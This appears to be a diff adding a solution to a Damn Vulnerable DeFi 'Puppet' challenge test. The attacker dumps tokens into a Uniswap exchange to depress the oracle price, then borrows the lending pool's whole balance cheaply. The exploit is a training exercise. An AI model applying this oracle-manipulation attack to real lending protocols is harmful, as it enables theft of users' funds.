@@ -100,7 +100,17 @@ contract Puppet is Test {
         /**
          * EXPLOIT START *
          */
+        uint256 depositRequired;
 
+        vm.startPrank(attacker);
+        dvt.approve(address(uniswapExchange), dvt.balanceOf(address(attacker)));
+        uniswapExchange.tokenToEthSwapInput(dvt.balanceOf(address(attacker)), 1, block.timestamp);
+
+        depositRequired = puppetPool.calculateDepositRequired(dvt.balanceOf(address(puppetPool)));
+        console.log("after: %d", depositRequired / 1e18);
+
+        puppetPool.borrow{value: depositRequired}(dvt.balanceOf(address(puppetPool)));
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
